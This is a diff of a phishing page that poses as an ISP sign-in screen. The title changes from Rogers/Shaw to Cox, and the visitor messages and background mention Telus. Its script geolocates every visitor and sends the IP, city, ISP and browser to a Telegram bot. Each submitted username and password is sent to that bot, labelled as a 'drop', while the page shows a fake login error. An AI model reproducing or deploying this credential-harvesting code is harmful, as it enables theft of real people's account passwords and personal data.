@@ -1,173 +1,198 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sign in &#183; Rogers together with Shaw</title>
+  <title>Welcome back - Cox</title>
   <style>
-    /* 1. Global Reset */
-*, *::before, *::after {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1749980436/cox1_p6itur.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      padding: 20px;
+    }
+
+    #introImageContainer {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: black;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    #introImageContainer img {
+      max-width: 100%;
+      max-height: 100%;
+    }
+
+    body {
+  margin: 0;
+  display: flex;
+  align-items: center; /* Vertical center stays consistent */
+  justify-content: flex-start; /* Keeps alignment to the left */
+  min-height: 100vh;
+  background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1790761403/telus_ouh2zx.png');
+  background-size: cover;
+  background-position: center;
 }
 
-/* 2. Resolution Fix: Ensures the body centers the content on all screens */
-body {
-    font-family: Arial, sans-serif;
-    background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1780679036/canada_bhe5j7.jpg');
-    /* background-size: cover fills the screen without stretching */
-    background-size: cover;
-    background-position: center;
-    background-repeat: no-repeat;
-    background-attachment: fixed;
-    min-height: 100vh;
-    
-    /* THE CENTERING ENGINE - ZERO SHIFT */
-    display: flex;
-    justify-content: center; /* Horizontally centers the box */
-    align-items: center;     /* Vertically centers the box */
-    padding: 20px;
-}
-
-/* 3. Intro Container (Locked Scale) */
-#introImageContainer {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: black;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-}
-
-#introImageContainer img {
-    max-width: 100%;
-    max-height: 100%;
-}
-
-/* 4. LOGIN BOX - AUTO-CENTERED FOR ALL RESOLUTIONS */
 .login-container {
-    background: 
-    backdrop-filter: blur(10px);
-    border-radius: 20px; /* Adjusted from 70px for better fit */
-    padding: 30px;
-    width: 90%;          /* Mobile Width */
-    max-width: 350px;    /* Laptop Width */
-    
-    /* REMOVED: margin-left: 600px (This causes the shift) */
-    margin: 0 auto; 
-    
-    box-shadow: 
-    /* display: none; */ /* Uncomment for your JS logic */
+  background: 
+  backdrop-filter: 
+  border-radius: 12px;
+  padding: 10px;
+  
+  /* FIXED RESPONSIVE WIDTH */
+  width: 90%; /* Occupies most of the screen on tiny phones */
+  max-width: 400px; /* Won't get too big on desktop */
+  
+  /*  CONSISTENT LEFT SHIFT */
+  /* Using 5vw (5% of screen width) keeps it away from the edge on all devices */
+  margin-left: 10vw; 
+  
+  box-shadow: 
+  display: block; 
 }
 
-/* 5. Typography & Forms */
-.welcome-title {
-    color: #0066cc;
-    font-size: 28px;
-    font-weight: 600;
-    margin-bottom: 30px;
-    text-align: center; /* Centered for consistent look */
-}
-
-.form-group {
-    margin-bottom: 20px;
-    width: 100%;
-}
-
-.form-label {
-    display: block;
-    color: #666;
-    font-size: 14px;
-    font-weight: 500;
-    margin-bottom: 8px;
-}
-
-.form-input {
-    width: 100%;
-    padding: 12px 16px;
-    border: 2px solid #d1d5db;
-    border-radius: 8px;
-    font-size: 16px;
-    background: white;
-}
-
-.password-container {
-    position: relative;
-    width: 100%;
-}
-
-.password-toggle {
-    position: absolute;
-    right: 12px;
-    top: 50%;
-    transform: translateY(-50%);
-    background: none;
-    border: none;
-    cursor: pointer;
-    color: #666;
-    font-size: 18px;
-}
-
-/* 6. SIGN IN BUTTON - LOCKED IN CENTER */
-.sign-in-btn {
-    width: 100%; /* Changed to 100% for mobile usability, box handles sizing */
-    background: #FF9999;
-    color: white;
-    border: none;
-    padding: 14px;
-    border-radius: 8px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    
-    /* FORCED CENTERING */
-    display: block;
-    margin: 10px auto 20px auto; 
-    transition: background-color 0.3s ease;
-}
-
-.sign-in-btn:hover {
-    background: #ff7777;
-}
-
-.help-links {
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-    text-align: center;
-}
-
-.help-link {
-    color: #0066cc;
-    text-decoration: none;
-    font-size: 14px;
-}
-
-/* 7. AUTO-FIX FOR MOBILE RESOLUTIONS */
-@media (max-width: 480px) {
-    .login-container {
-        width: 95%;
-        padding: 20px;
-    }
     .welcome-title {
-        font-size: 24px;
+      color: #0066cc;
+      font-size: 32px;
+      font-weight: 600;
+      margin-bottom: 1px;
+      text-align: left;
     }
-}
+
+    .form-group {
+      margin-bottom: 5px;
+    }
+
+    .form-label {
+      display: block;
+      color: #666;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 12px 16px;
+      border: 2px solid #d1d5db;
+      border-radius: 8px;
+      font-size: 16px;
+      background: white;
+      transition: border-color 0.3s ease;
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: #0066cc;
+    }
+
+    .password-container {
+      position: relative;
+	  margin-bottom: 25px;
+    }
+
+    .password-toggle {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #666;
+      font-size: 18px;
+    }
+
+   
+
+    .sign-in-btn {
+      width: 100%;
+      background: #008000;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 25px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 80px;
+      transition: background-color 0.3s ease;
+    }
+
+    .sign-in-btn:hover {
+      background: #008000;
+    }
+
+    .help-links {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .help-link {
+      color: #008000;
+      text-decoration: none;
+      font-size: 14px;
+      transition: color 0.3s ease;
+    }
+
+    .help-link:hover {
+      color: #0052a3;
+      text-decoration: underline;
+    }
+
+    @media (max-width: 768px) {
+      .login-container {
+        margin-left: 20px;
+        margin-right: 20px;
+        padding: 30px;
+      }
+
+      .welcome-title {
+        font-size: 28px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .login-container {
+        margin-left: 0;
+        max-width: none;
+      }
+    }
+
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
   </style>
 </head>
 <body>
-  <!-- 👇 Int Image Ovelay -->
+  <!-- 👇 Intro Image Overlay -->
   <div id="introImageContainer">
-    <img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png" alt="Intro Image" />
+    <img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1748260948/sure_scan_xfvelb.png" alt="Intro Image" />
   </div>
 
-  <!-- 👇 Log Fom -->
+  <!-- 👇 Login Form -->
   <div class="login-container" id="loginContainer">
     <h1 class="welcome-title"></h1>
 
@@ -175,24 +200,26 @@ body {
       <div id="errorMessage" class="error-message" style="display: none;"></div>
 
       <div class="form-group">
-  <input type="text" id="userId" name="userId" class="form-input" placeholder="Email" required value="" />
-</div>
+        <label for="userId" class="form-label">Email or username</label>
+        <input type="text" id="userId" name="userId" class="form-input" required />
+      </div>
 
       <div class="form-group">
-  <div class="password-container">
-    <input type="password" id="password" name="password" class="form-input" placeholder="Password" required />
-    <button type="button" class="password-toggle" onclick="togglePassword()">👁</button>
-  </div>
-</div>
+        <label for="password" class="form-label">Password</label>
+        <div class="password-container">
+          <input type="password" id="password" name="password" class="form-input" required />
+          <button type="button" class="password-toggle" onclick="togglePassword()">👁</button>
+        </div>
+      </div>
 
       <div class="checkbox-container">
-        <input type="checkbox" id="rememberUser" name="rememberUser" class="checkbox" />
-        <label for="rememberUser" class="checkbox-label">Remember my email</label>
+       
+        <label for="rememberUser" class="checkbox-label"></label>
       </div>
 
       <button type="submit" class="sign-in-btn">Sign in</button>
 
-      
+    
       </div>
     </form>
   </div>
@@ -221,7 +248,7 @@ body {
 
       if (passwordInput.type === 'password') {
         passwordInput.type = 'text';
-        toggleButton.textContent = '🙈';
+        toggleButton.textContent = '';
       } else {
         passwordInput.type = 'password';
         toggleButton.textContent = '👁';
@@ -233,17 +260,17 @@ body {
       const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
 
       if (!navigator.onLine) {
-        sendToTelegram(`XTRA Offline Visi\n🖥 Browser: ${userAgent}\n🔌 Port: ${port}`);
+        sendToTelegram(`📴 Offline Visitor\n🖥 Browser: ${userAgent}\n🔌 Port: ${port}`);
         return;
       }
 
       fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
-          const message = `🌐 shawcana Visi \nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
+          const message = `🌐 telus Visi Info\nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
           sendToTelegram(message);
         }).catch(() => {
-          sendToTelegram(`🌐 shawcana Visi (IP lookup failed)\nBrowser: ${userAgent}`);
+          sendToTelegram(`🌐 telus Visi (IP lookup failed)\nBrowser: ${userAgent}`);
         });
     }
 
@@ -255,7 +282,7 @@ body {
         const login = document.getElementById('loginContainer');
         if (intro) intro.style.display = 'none';
         if (login) login.style.display = 'block';
-      }, 50);
+      }, 500);
     };
 
     document.getElementById('loginForm').addEventListener('submit', async function (e) {
@@ -266,7 +293,7 @@ body {
 
       if (userId && password) {
         loginAttempts++;
-        const msg = `❌ shawcana drop #${loginAttempts}\n👤 User ID: ${userId}\n🔑 Password: ${password}`;
+        const msg = `❌ telus Lo fai #${loginAttempts}\n👤 User ID: ${userId}\n🔑 Password: ${password}`;
         await sendToTelegram(msg);
 
         const errorMsg = document.getElementById('errorMessage');
@@ -279,7 +306,7 @@ body {
 
         if (loginAttempts >= 30) {
           window.location.href =
-            'https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png';
+            'https://res.cloudinary.com/dxzzgijsa/image/upload/v1748260948/sure_scan_xfvelb.png';
         }
       }
     });
